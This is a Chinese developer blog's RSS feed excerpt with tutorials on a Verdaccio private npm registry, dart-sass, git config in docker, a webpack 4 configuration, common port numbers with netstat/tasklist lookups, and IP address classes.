irb<span>(</span>main<span>)</span>:001:<span><span>0</span>></span> user.save<span>!</span>
irb<span>(</span>main<span>)</span>:001:<span><span>0</span>></span> quit
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="私有-npm-代理注册表" tabindex="-1"> 私有 npm 代理注册表</h2>
<p>在项目文件夹下创建 <code>docker-compose.yml</code></p>
<div><pre><code><span>version</span><span>:</span> <span>"3"</span>

<span>services</span><span>:</span>
  <span>npm-private</span><span>:</span>
    <span>container_name</span><span>:</span> npm<span>-</span>private
    <span>image</span><span>:</span> verdaccio/verdaccio
    <span>restart</span><span>:</span> always
    <span>ports</span><span>:</span>
      <span>-</span> <span>"4873:4873"</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="拓展-1" tabindex="-1"> 拓展</h3>
<div><p>提示</p>
<p>windows 环境下不想使用 docker 的解决方案, 使用 <code>forever</code> + <code>verdaccio</code></p>
</div>
<p>安装依赖</p>
<div><pre><code><span>npm</span> i -g forever verdaccio
</code></pre><div aria-hidden="true"><div></div></div></div><p>修改 <code>verdaccio</code> 的配置文件, 参考文件路径为 <code>C:/Users/Administrator/AppData/Roaming/verdaccio/config.yaml</code> （必须修改, 否则只能本机访问）, 在该文件内添加</p>
<div><pre><code>listen: 0.0.0.0:4873
</code></pre><div aria-hidden="true"><div></div></div></div><p>编写 <code>bat</code> windows 脚本</p>
<p>开始脚本 <code>forever-npm-start.bat</code></p>
<div><pre><code>@echo off
C:
cd C:\Users\Administrator\AppData\Roaming\npm\node_modules\verdaccio\build\lib
forever start cli.js
exit
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p>结束脚本 <code>forever-npm-stop.bat</code></p>
<div><pre><code>@echo off
C:
cd C:\Users\Administrator\AppData\Roaming\npm\node_modules\verdaccio\build\lib
forever stop cli.js
exit
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="css-预处理-sass-的默认实现将迁移到-dart-sass" tabindex="-1"> CSS 预处理 SASS 的默认实现将迁移到 Dart Sass</h3>
<p>Web 开发中流行的 CSS 预处理 - Sass 14, 于 2016 年 11 月 1 日在博客正式对外公布了 alpha 版本的 Dart Sass 32 项目, 即他们使用 Dart 对 Sass 进行了重写。对于这次迁移/重写, Sass 项目组做了以下说明:</p>
<p>关于 <a href="https://github.com/sass/dart-sass" target="_blank" rel="noopener noreferrer">github:dart-sass</a> <a href="https://sass-lang.com/dart-sass" target="_blank" rel="noopener noreferrer">dart-sass</a></p>
<p>因为使用 <code>node-sass</code> 无论是在 Windows 环境下还是在 docker 的 liunx 环境下都需要依赖 <code>gcc</code> 和 <code>python2.7</code> , 有的时候会出现编译错误（指的是在执行 <code>npm install</code> 安装 <code>node-sass</code> 的时候由于部分库不齐备或者是编译原因导致 <code>node-sass</code> 无法正常安装）, 所以使用 <code>dart-sass</code> 来代替 <code>node-sass</code> 是个不错的选择, 至少目前在自测中是没有出现编译问题的, 至于兼容性问题, GitHub 文档中也给出承诺 <a href="https://github.com/sass/dart-sass#browser-compatibility" target="_blank" rel="noopener noreferrer">Browser Compatibility</a></p>
<h3 id="为什么重写-sass" tabindex="-1"> 为什么重写 Sass？</h3>
<p>Sass 的主要实现有 Ruby Sass 7 和 LibSass 10（node-sass 底层使用的是 LibSass）, 它们都有各自的优缺点。Ruby Sass 的实现语言是高级语言 Ruby, 更容易迭代, 但存在运行速度慢, 不易安装的缺点。LibSass 虽然速度快, 但它的开发语言是 C/C++, 迭代速度慢, 无法快速地添加各种功能。</p>
<h3 id="为什么使用-dart" tabindex="-1"> 为什么使用 Dart？</h3>
<p>Dart 的运行速度是真的快, 对于大型样式文件, Dart Sass 的处理速度是 Ruby Sass 的 5~10 倍, 且只比 LibSass 慢 1.5 倍左右。同时, Dart 是一门具备静态类型的动态语言, 对比 C/C++ 甚至是 Ruby, Dart 相对更容易上手且代码也更易于编写和维护。此外, Dart 具备编译输出为 JavaScript 的能力, 使得 Dart Sass 可以兼容 NodeJS 平台。</p>
<h3 id="各种实现的后续规划" tabindex="-1"> 各种实现的后续规划？</h3>
<p>LibSass 作为目前性能最好的 Sass 实现, 后续将继续维护, 只是它不再需要背负快速添加各种新功能的压力。Ruby Sass 目前也会同步维护, 但在无人接手的情况下, 它将逐渐边缘化。Sass 项目组后续主要精力将转移到 Dart Sass, 其稳定版本预计在 2017 年初放出。</p>
<h3 id="git-commit" tabindex="-1"> git commit</h3>
<p>现在由于我们在 docker 内部安装项目依赖, 也就是说我们当前的环境变成了 liunx, 相关的依赖包也就是 liunx 的依赖包, 所以在 windows 环境下执行 <code>git commit</code> 的时候会报依赖找不到, 那是因为安装了 liunx 的依赖包, 两个平台的安装包是不一样的</p>
<p>那么在 docker 下执行 <code>git commit</code> 的时候又会失败, 因为 commit 的时候 git 需要知道当前的 commit 作者是谁, 这时候不必全局配置 commit 的 config 信息, 只需在项目目录下执行</p>
<div><pre><code><span>git</span> config   user.name <span>'XXX'</span>
<span>git</span> config   user.email <span>'XXX'</span>
<span># or</span>
<span>git</span> config  --local  user.name <span>'XXX'</span>
<span>git</span> config  --local user.email <span>'XXX'</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p>设置完用 <code>git config --list</code> 进行检验, 之后的 commit 操作就在 docker 容器下执行就行了</p>
]]></content:encoded>
    </item>
    <item>
      <title>webpack 初学指南</title>
      <link>https://vxhly.github.io/views/manual/webpack-guide.html</link>
      <guid>https://vxhly.github.io/views/manual/webpack-guide.html</guid>
      <source url="https://vxhly.github.io/rss.xml">webpack 初学指南</source>
      <description>前言
这边用到的 webpack 版本 4.0+, 这边将接触到 TypeScript, ES6, ES7, sass 等 loader ... 不想解释了直接上代码。

</description>
      <category>manual</category>
      <pubDate>Fri, 16 Nov 2018 14:25:54 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>这边用到的 webpack 版本 4.0+, 这边将接触到 TypeScript, ES6, ES7, sass 等 loader ... 不想解释了直接上代码。</p>
</div>

<h2 id="目录结构" tabindex="-1"> 目录结构</h2>
<div><pre><code>--- dist
  <span>|</span>- css
  <span>|</span>- js
  <span>|</span>- images
  <span>|</span>- fonts
  <span>|</span>- index.html
--- src
  <span>|</span>- scss
  <span>|</span>- js
  <span>|</span>- images
  <span>|</span>- fonts
  <span>|</span>- index.html
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="package-json" tabindex="-1"> package.json</h2>
<div><pre><code><span>{</span>
  <span>"name"</span><span>:</span> <span>"webpack-demo"</span><span>,</span>
  <span>"version"</span><span>:</span> <span>"1.0.0"</span><span>,</span>
  <span>"description"</span><span>:</span> <span>""</span><span>,</span>
  <span>"main"</span><span>:</span> <span>"index.js"</span><span>,</span>
  <span>"scripts"</span><span>:</span> <span>{</span>
    <span>"serve"</span><span>:</span> <span>"webpack-dev-server --compress --progress "</span><span>,</span>
    <span>"dev"</span><span>:</span> <span>"webpack --mode development"</span><span>,</span>
    <span>"build"</span><span>:</span> <span>"webpack --mode production"</span>
  <span>}</span><span>,</span>
  <span>"author"</span><span>:</span> <span>""</span><span>,</span>
  <span>"license"</span><span>:</span> <span>"MIT"</span><span>,</span>
  <span>"devDependencies"</span><span>:</span> <span>{</span>
    <span>"@babel/core"</span><span>:</span> <span>"^7.1.5"</span><span>,</span>
    <span>"@babel/preset-env"</span><span>:</span> <span>"^7.1.5"</span><span>,</span>
    <span>"autoprefixer"</span><span>:</span> <span>"^9.3.1"</span><span>,</span>
    <span>"babel-cli"</span><span>:</span> <span>"^6.26.0"</span><span>,</span>
    <span>"babel-eslint"</span><span>:</span> <span>"^10.0.1"</span><span>,</span>
    <span>"babel-loader"</span><span>:</span> <span>"^8.0.4"</span><span>,</span>
    <span>"babel-preset-env"</span><span>:</span> <span>"^1.7.0"</span><span>,</span>
    <span>"clean-webpack-plugin"</span><span>:</span> <span>"^1.0.0"</span><span>,</span>
    <span>"compression-webpack-plugin"</span><span>:</span> <span>"^2.0.0"</span><span>,</span>
    <span>"css-loader"</span><span>:</span> <span>"^1.0.1"</span><span>,</span>
    <span>"eslint"</span><span>:</span> <span>"^5.9.0"</span><span>,</span>
    <span>"eslint-loader"</span><span>:</span> <span>"^2.1.1"</span><span>,</span>
    <span>"file-loader"</span><span>:</span> <span>"^2.0.0"</span><span>,</span>
    <span>"html-webpack-plugin"</span><span>:</span> <span>"^3.2.0"</span><span>,</span>
    <span>"html-withimg-loader"</span><span>:</span> <span>"^0.1.16"</span><span>,</span>
    <span>"mini-css-extract-plugin"</span><span>:</span> <span>"^0.4.4"</span><span>,</span>
    <span>"node-sass"</span><span>:</span> <span>"^4.10.0"</span><span>,</span>
    <span>"open-browser-webpack-plugin"</span><span>:</span> <span>"0.0.5"</span><span>,</span>
    <span>"optimize-css-assets-webpack-plugin"</span><span>:</span> <span>"^5.0.1"</span><span>,</span>
    <span>"postcss-loader"</span><span>:</span> <span>"^3.0.0"</span><span>,</span>
    <span>"sass-loader"</span><span>:</span> <span>"^7.1.0"</span><span>,</span>
    <span>"standard"</span><span>:</span> <span>"^12.0.1"</span><span>,</span>
    <span>"style-loader"</span><span>:</span> <span>"^0.23.1"</span><span>,</span>
    <span>"ts-loader"</span><span>:</span> <span>"^5.3.0"</span><span>,</span>
    <span>"typescript"</span><span>:</span> <span>"^3.1.6"</span><span>,</span>
    <span>"url-loader"</span><span>:</span> <span>"^1.1.2"</span><span>,</span>
    <span>"webpack"</span><span>:</span> <span>"^4.25.1"</span><span>,</span>
    <span>"webpack-cli"</span><span>:</span> <span>"^3.1.2"</span><span>,</span>
    <span>"webpack-dev-server"</span><span>:</span> <span>"^3.1.10"</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="babelrc" tabindex="-1"> .babelrc</h2>
<div><pre><code><span>{</span>
  <span>"presets"</span><span>:</span> <span>[</span><span>"@babel/preset-env"</span><span>]</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h2 id="eslintrc-js" tabindex="-1"> .eslintrc.js</h2>
<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>
  <span>root</span><span>:</span> <span>true</span><span>,</span>
  <span>env</span><span>:</span> <span>{</span>
    <span>node</span><span>:</span> <span>true</span><span>,</span>
    <span>browser</span><span>:</span> <span>true</span><span>,</span>
  <span>}</span><span>,</span>
  <span>extends</span><span>:</span> <span>[</span><span>"standard"</span><span>]</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="tsconfig-json" tabindex="-1"> tsconfig.json</h2>
<div><pre><code><span>{</span>
  <span>"compilerOptions"</span><span>:</span> <span>{</span>
    <span>"module"</span><span>:</span> <span>"commonjs"</span><span>,</span>
    <span>"target"</span><span>:</span> <span>"es5"</span><span>,</span>
    <span>"sourceMap"</span><span>:</span> <span>true</span><span>,</span>
    <span>"experimentalDecorators"</span><span>:</span> <span>true</span>
  <span>}</span><span>,</span>
  <span>"exclude"</span><span>:</span> <span>[</span><span>"node_modules"</span><span>]</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="webpack-config-js" tabindex="-1"> webpack.config.js</h2>
<div><pre><code><span>const</span> path <span>=</span> <span>require</span><span>(</span><span>'path'</span><span>)</span>
<span>// 拆分 css 出来单独打包</span>
<span>const</span> MiniCssExtractPlugin <span>=</span> <span>require</span><span>(</span><span>'mini-css-extract-plugin'</span><span>)</span>
<span>// 添加不同浏览器的兼容</span>
<span>const</span> autoprefixer <span>=</span> <span>require</span><span>(</span><span>'autoprefixer'</span><span>)</span>
<span>// 打包之前清掉原打包信息</span>
<span>const</span> CleanWebpackPlugin <span>=</span> <span>require</span><span>(</span><span>'clean-webpack-plugin'</span><span>)</span>
<span>// 结合 postcss 来解决不同浏览器的兼容</span>
<span>const</span> OptimizeCssAssetsPlugin <span>=</span> <span>require</span><span>(</span><span>'optimize-css-assets-webpack-plugin'</span><span>)</span>
<span>const</span> HtmlWebpackPlugin <span>=</span> <span>require</span><span>(</span><span>'html-webpack-plugin'</span><span>)</span>
<span>const</span> OpenBrowserPlugin <span>=</span> <span>require</span><span>(</span><span>'open-browser-webpack-plugin'</span><span>)</span>
<span>const</span> CompressionWebpackPlugin <span>=</span> <span>require</span><span>(</span><span>'compression-webpack-plugin'</span><span>)</span>

<span>const</span> productionGzipExtensions <span>=</span> <span>[</span><span>'js'</span><span>,</span> <span>'css'</span><span>]</span>

module<span>.</span>exports <span>=</span> <span>{</span>
        <span>mode</span><span>:</span> <span>'development'</span><span>,</span>
        <span>entry</span><span>:</span> path<span>.</span><span>join</span><span>(</span>__dirname<span>,</span> <span>'./src/js/main.ts'</span><span>)</span><span>,</span>
        <span>output</span><span>:</span> <span>{</span>
            <span>filename</span><span>:</span> <span>'js/[name]-[hash:32].js'</span><span>,</span>
            <span>path</span><span>:</span> path<span>.</span><span>resolve</span><span>(</span>__dirname<span>,</span> <span>'dist'</span><span>)</span>
        <span>}</span><span>,</span>
        <span>resolve</span><span>:</span> <span>{</span>
            <span>extensions</span><span>:</span> <span>[</span><span>'.js'</span><span>,</span> <span>'.json'</span><span>,</span> <span>'.css'</span><span>,</span> <span>'.scss'</span><span>,</span> <span>'.sass'</span><span>,</span> <span>'ts'</span><span>]</span><span>,</span>
            <span>alias</span><span>:</span> <span>{</span>
                <span>'@'</span><span>:</span> path<span>.</span><span>join</span><span>(</span>__dirname<span>,</span> <span>'src'</span><span>)</span>
            <span>}</span>
        <span>}</span><span>,</span>
        <span>module</span><span>:</span> <span>{</span>
            <span>rules</span><span>:</span> <span>[</span>

                <span>{</span>
                    <span>test</span><span>:</span> <span><span>/</span><span>\.ts$</span><span>/</span></span><span>,</span>
                    <span>exclude</span><span>:</span> <span><span>/</span><span>node_modules</span><span>/</span></span><span>,</span>
                    <span>use</span><span>:</span> <span>'ts-loader'</span>
                <span>}</span><span>,</span>
                <span>{</span>
                    <span>test</span><span>:</span> <span><span>/</span><span>\.js$</span><span>/</span></span><span>,</span>
                    <span>exclude</span><span>:</span> <span><span>/</span><span>node_modules</span><span>/</span></span><span>,</span>
                    <span>use</span><span>:</span> <span>[</span>

                        <span>{</span>
                            <span>loader</span><span>:</span> <span>'babel-loader'</span>
                        <span>}</span>

                    <span>]</span>

                <span>}</span><span>,</span>
                <span>{</span>
                    <span>test</span><span>:</span> <span><span>/</span><span>\.(css)$</span><span>/</span></span><span>,</span>
                    <span>// exclude: /node_modules/,</span>
                    <span>use</span><span>:</span> <span>[</span><span>{</span>
                        <span>loader</span><span>:</span> <span>'css-loader'</span><span>,</span>
                        <span>options</span><span>:</span> <span>{</span>
                            <span>importLoaders</span><span>:</span> <span>2</span>
                        <span>}</span>
                    <span>}</span><span>]</span>
                <span>}</span><span>,</span>
                <span>{</span>
                    <span>test</span><span>:</span> <span><span>/</span><span>\.(sass|scss)$</span><span>/</span></span><span>,</span>
                    <span>// exclude: /node_modules/,</span>
                    <span>use</span><span>:</span> <span>[</span>

                        <span>{</span>
                            <span>loader</span><span>:</span> MiniCssExtractPlugin<span>.</span>loader
                        <span>}</span><span>,</span>
                        <span>{</span>
                            <span>loader</span><span>:</span> <span>'css-loader'</span><span>,</span>
                            <span>options</span><span>:</span> <span>{</span>
                                <span>importLoaders</span><span>:</span> <span>2</span>
                            <span>}</span>
                        <span>}</span><span>,</span>
                        <span>{</span>
                            <span>loader</span><span>:</span> <span>'postcss-loader'</span><span>,</span>
                            <span>options</span><span>:</span> <span>{</span>
                                <span>plugins</span><span>:</span> <span>(</span><span>)</span> <span>=></span> <span>[</span>
                                    <span>autoprefixer</span><span>(</span><span>{</span>
                                        <span>browsers</span><span>:</span> <span>[</span>
                                            <span>'ie >= 8'</span><span>,</span>
                                            <span>'ie_mob >= 10'</span><span>,</span>
                                            <span>'ff >= 26'</span><span>,</span>
                                            <span>'chrome >= 20'</span><span>,</span>
                                            <span>'safari >= 6'</span><span>,</span>
                                            <span>'opera >= 12'</span><span>,</span>
                                            <span>'Firefox >= 24'</span><span>,</span>
                                            <span>'Explorer >= 8'</span><span>,</span>
                                            <span>'ios >= 5'</span><span>,</span>
                                            <span>'android >= 2.3'</span><span>,</span>
                                            <span>'bb >= 10'</span><span>,</span>
                                            <span>'last 1 version'</span>
                                        <span>]</span>
                                    <span>}</span><span>)</span>
                                <span>]</span>
                            <span>}</span>
                        <span>}</span><span>,</span>
                        <span>{</span>
                            <span>loader</span><span>:</span> <span>'sass-loader'</span>
                        <span>}</span>

                    <span>]</span>
                <span>}</span><span>,</span>
                <span>{</span>
                    <span>test</span><span>:</span> <span><span>/</span><span>\.(jpg|png|gif|jpeg|woff|woff2|svg|ttf|eot)$</span><span>/</span></span><span>,</span>
                    <span>use</span><span>:</span> <span>[</span>

                        <span>{</span>
                            <span>loader</span><span>:</span> <span>'url-loader'</span><span>,</span>
                            <span>options</span><span>:</span> <span>{</span>
                                <span>limit</span><span>:</span> <span>8192</span><span>,</span>
                                <span>name</span><span>:</span> <span>'images/[name]-[hash:32].[ext]'</span>
                            <span>}</span>
                        <span>}</span>

                    <span>]</span>
                <span>}</span><span>,</span>
                <span>{</span>
                    <span>test</span><span>:</span> <span><span>/</span><span>\.html$</span><span>/</span></span><span>,</span>
                    <span>loader</span><span>:</span> <span>'html-withimg-loader'</span>
                <span>}</span><span>,</span>
                <span>{</span>
                    <span>test</span><span>:</span> <span><span>/</span><span>\.(woff|woff2|svg|ttf|eot)$</span><span>/</span></span><span>,</span>
                    <span>use</span><span>:</span> <span>[</span>

                        <span>{</span>
                            <span>loader</span><span>:</span> <span>'file-loader'</span><span>,</span>
                            <span>options</span><span>:</span> <span>{</span>
                                <span>name</span><span>:</span> <span>'fonts/[name].[hash:8].[ext]'</span>
                            <span>}</span>
                        <span>}</span> <span>// 项目设置打包到dist下的fonts文件夹下</span>

                    <span>]</span>
                <span>}</span>
            <span>]</span>
        <span>}</span><span>,</span>
        <span>plugins</span><span>:</span> <span>[</span>
            <span>new</span> <span>HtmlWebpackPlugin</span><span>(</span><span>{</span>
                <span>minify</span><span>:</span> <span>{</span>
                    <span>removeAttributeQuotes</span><span>:</span> <span>true</span> <span>// 去掉属性值后的双引号</span>
                <span>}</span><span>,</span>
                <span>hash</span><span>:</span> <span>true</span><span>,</span>
                <span>template</span><span>:</span> <span>'./src/index.html'</span><span>,</span>
                <span>inject</span><span>:</span> <span>'body'</span>
            <span>}</span><span>)</span><span>,</span>
            <span>new</span> <span>CleanWebpackPlugin</span><span>(</span><span>[</span><span>'dist'</span><span>]</span><span>)</span><span>,</span>
            <span>new</span> <span>MiniCssExtractPlugin</span><span>(</span><span>{</span>
                <span>filename</span><span>:</span> <span>'css/[name]-[hash:32].css'</span>
            <span>}</span><span>)</span><span>,</span>
            <span>new</span> <span>OptimizeCssAssetsPlugin</span><span>(</span><span>{</span>
                <span>assetNameRegExp</span><span>:</span> <span><span>/</span><span>\.css$</span><span>/</span><span>g</span></span><span>,</span>
                <span>cssProcessor</span><span>:</span> <span>require</span><span>(</span><span>'cssnano'</span><span>)</span><span>,</span>
                <span>cssProcessorOptions</span><span>:</span> <span>{</span>
                    <span>safe</span><span>:</span> <span>true</span><span>,</span>
                    <span>discardComments</span><span>:</span> <span>{</span>
                        <span>removeAll</span><span>:</span> <span>true</span>
                    <span>}</span>
                <span>}</span><span>,</span>
                <span>canPrint</span><span>:</span> <span>true</span>
            <span>}</span><span>)</span><span>,</span>
            <span>new</span> <span>OpenBrowserPlugin</span><span>(</span><span>{</span>
                <span>url</span><span>:</span> <span>'http://localhost:3000'</span>
            <span>}</span><span>)</span><span>,</span>
            <span>new</span> <span>CompressionWebpackPlugin</span><span>(</span><span>{</span>
                <span>test</span><span>:</span> <span>new</span> <span>RegExp</span><span>(</span><span>'\\.('</span> <span>+</span> productionGzipExtensions<span>.</span><span>join</span><span>(</span><span>'|'</span><span>)</span> <span>+</span> '<span>)</span><span>)</span><span>,</span>
                    <span>threshold</span><span>:</span> <span>8192</span><span>,</span>
                    <span>minRatio</span><span>:</span> <span>0.8</span>
                <span>}</span><span>)</span><span>]</span><span>,</span>
            <span>devServer</span><span>:</span> <span>{</span>
                <span>contentBase</span><span>:</span> path<span>.</span><span>join</span><span>(</span>__dirname<span>,</span> <span>'dist'</span><span>)</span><span>,</span>
                <span>compress</span><span>:</span> <span>true</span><span>,</span>
                <span>port</span><span>:</span> <span>3000</span>
            <span>}</span>
        <span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>常见的端口号以及其对应的应用程序或服务</title>
      <link>https://vxhly.github.io/views/networking/common-port.html</link>
      <guid>https://vxhly.github.io/views/networking/common-port.html</guid>
      <source url="https://vxhly.github.io/rss.xml">常见的端口号以及其对应的应用程序或服务</source>
      <description>前言
列出 TCP/UDP 协议常见的端口号占用情况, 以助于分析该服务器开放了哪些端口号, 或者程序占用了哪些端口号。

</description>
      <category>networking</category>
      <pubDate>Tue, 16 Aug 2016 16:04:29 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>列出 TCP/UDP 协议常见的端口号占用情况, 以助于分析该服务器开放了哪些端口号, 或者程序占用了哪些端口号。</p>
</div>

<h2 id="如何查看" tabindex="-1"> 如何查看</h2>
<h3 id="windows-系统" tabindex="-1"> Windows 系统</h3>
<p>通过 <code>netstat</code> 列出所有端口的使用情况, <code>For Example:</code></p>
<div><pre><code><span>netstat</span> -ano
</code></pre><div aria-hidden="true"><div></div></div></div><p>通过 <code>findstr</code> 查询包含关键字的端口使用情况, <code>For Example:</code></p>
<div><pre><code>netsata -ano <span>|</span> findstr <span>":80"</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>通过 <code>tasklist</code> 查询哪个程序或应用占用该端口对应的 <code>PID</code> , <code>For Example:</code></p>
<div><pre><code>tasklist <span>|</span> findstr <span>"2180"</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="liunx-系统" tabindex="-1"> Liunx 系统</h3>
<p>通过 <code>netstat</code> 列出监听的端口, <code>For Example:</code></p>
<div><pre><code><span>netstat</span> -tlun
</code></pre><div aria-hidden="true"><div></div></div></div><p>通过 <code>netstat</code> 列出所有的网络连接, <code>For Example:</code></p>
<div><pre><code><span>netstat</span> -an
</code></pre><div aria-hidden="true"><div></div></div></div><p>通过 <code>ps</code> 查看进程占用状态, <code>For Example:</code></p>
<div><pre><code><span>ps</span> -ef <span>|</span> <span>grep</span> sshd
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="常见端口号" tabindex="-1"> 常见端口号</h2>
<h3 id="tcp-协议相关" tabindex="-1"> TCP 协议相关</h3>
<ul>
<li><code>20</code> =&gt; FTP（文件传输协议） 传输数据端口, 用于纯属数据</li>
<li><code>21</code> =&gt; FTP（文件传输协议） 连接端口, 用于登陆认证</li>
<li><code>22</code> =&gt; SSH（安全外壳协议） 加密的远程连接, SFTP（安全的文件传输协议） 传输安全的数据</li>
<li><code>23</code> =&gt; Telnet（远程终端协议） 相对不安全的远程连接</li>
<li><code>25</code> =&gt; SMTP（简单邮件传输协议） 使用的端口</li>
<li><code>53</code> =&gt; DNS 服务器开放的端口, 入侵者可能是试图进行区域传递（TCP）, 所以防火墙常常过滤或记录该端口</li>
<li><code>80</code> / <code>8080</code> / <code>3128</code> / <code>8081</code> / <code>9080</code> =&gt; HTTP（超文本传输协议） 使用的端口</li>
<li><code>109</code> =&gt; POP2（邮件协议 2） 服务器开放的端口</li>
<li><code>110</code> =&gt; POP3（邮件协议 3） 服务器开放的端口, 用于接收邮件, 客户端访问服务器的邮件服务</li>
<li><code>139</code> =&gt; 文件共享使用的端口</li>
<li><code>443</code> =&gt; HTTPS（安全套接字层的超文本传输协议） 默认端口, 传输数据更加安全</li>
<li><code>445</code> =&gt; SMB（文件共享服务）开放的端口</li>
<li><code>1433</code> =&gt; SQL Server 默认的端口, 用于供 SQL Server 对外提供服务</li>
<li><code>1521</code> =&gt; Oracle 数据库默认端口</li>
<li><code>3306</code> =&gt; MySQL 数据库默认端口</li>
<li><code>3389</code> =&gt; 远程桌面使用的端口</li>
<li><code>8080</code> =&gt; Tomcat 服务器的默认端口</li>
</ul>
<h3 id="udp-协议相关" tabindex="-1"> UDP 协议相关</h3>
<ul>
<li><code>53</code> =&gt; DNS 服务器开放的端口, 入侵者可能是试图进行欺骗 DNS（UDP）或隐藏其他的通信, 所以防火墙常常过滤或记录该端口</li>
<li><code>69</code> =&gt; TFTP（简单文件传输协议） 默认的端口号</li>
<li><code>139</code> =&gt; 文件共享使用的端口</li>
<li><code>161</code> =&gt; SNMP（简单网络管理协议） 入侵者常探测的端口</li>
<li><code>162</code> =&gt; SNMP（简单网络管理协议） 默认的端口号</li>
<li><code>445</code> =&gt; SMB（文件共享服务）开放的端口</li>
<li><code>1434</code> =&gt; SQL Server 默认的端口, 于向请求者返回 SQL Server 使用了哪个 TCP/IP 端口</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>IP 地址规划</title>
      <link>https://vxhly.github.io/views/networking/ip-address-planning.html</link>
      <guid>https://vxhly.github.io/views/networking/ip-address-planning.html</guid>
      <source url="https://vxhly.github.io/rss.xml">IP 地址规划</source>
      <description>前言
当申请到一个 C 类网络地址时, 很多时候需要对其子网划分, 那么一个高效简便的子网划分方法由此而生。

</description>
      <category>networking</category>
      <pubDate>Sun, 11 Sep 2016 21:49:24 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>当申请到一个 C 类网络地址时, 很多时候需要对其子网划分, 那么一个高效简便的子网划分方法由此而生。</p>
</div>

<h2 id="先分清五类网络地址" tabindex="-1"> 先分清五类网络地址</h2>
<p>IP 地址分为 A, B, C, D, E 五类</p>
<ul>
<li>网络号: 用于识别主机所在的网络</li>
<li>主机号: 用于识别该网络中的主机</li>
</ul>
<p>其中 A 类分配给政府机关使用, B 类地址给大中型企业使用, C 类地址给个人使用。这三种是主要的。</p>
<p>D 类用于组播, E 类用于实验, 各类可容纳的地址数目不同。</p>
<p>其中 A 类、B 类、C 类这三类地址用于 <code>TCP/IP</code> 节点。其它两类 D 类和 E 类被用于特殊用途。</p>
<p>A、B、C 三类 IP 地址的特征: 当将 IP 地址写成二进制形式时, A 类地址的第一位总是 O, B 类地址的前两位总是 10, C 类地址的前三位总是 <code>110</code> 。</p>
<h3 id="a-类地址" tabindex="-1"> A 类地址</h3>
<ul>
<li>A 类地址第 1 字节为网络地址, 其它 3 个字节为主机地址</li>
<li>A 类地址范围: <code>1.0.0.1</code> -- <code>126.255.255.254</code></li>
<li>A 类地址中的私有地址和保留地址（所谓的私有地址就是在互联网上不使用, 而被用在局域网络中的地址；保留地址则不被分配。）</li>
</ul>
<p>-- <code>10.X.X.X</code> 是私有地址 -- <code>127.X.X.X</code> 是保留地址, 用做循环测试用的</p>
<ul>
<li>最大的网络数: <code>2^7-2</code> , 网络中最大的主机数: <code>2^24-2</code></li>
</ul>
<h3 id="b-类地址" tabindex="-1"> B 类地址</h3>
<ul>
<li>B 类地址第 1 字节和第 2 字节为网络地址, 其它 2 个字节为主机地址</li>
<li>B 类地址范围: <code>128.0.0.1</code> -- <code>191.255.255.254</code></li>
<li>B 类地址的私有地址和保留地址</li>
</ul>
<p>-- <code>172.16.0.0</code> -- <code>172.31.255.255</code> 是私有地址 -- <code>169.254.X.X</code> 是保留地址。如果你的 IP 地址是自动获取 IP 地址, 而你在网络上又没有找到可用的 DHCP 服务器。就会得到其中一个 IP</p>
<ul>
<li>最大的网络数: <code>2^14-2</code> , 网络中最大的主机数: <code>2^16-2</code></li>
</ul>
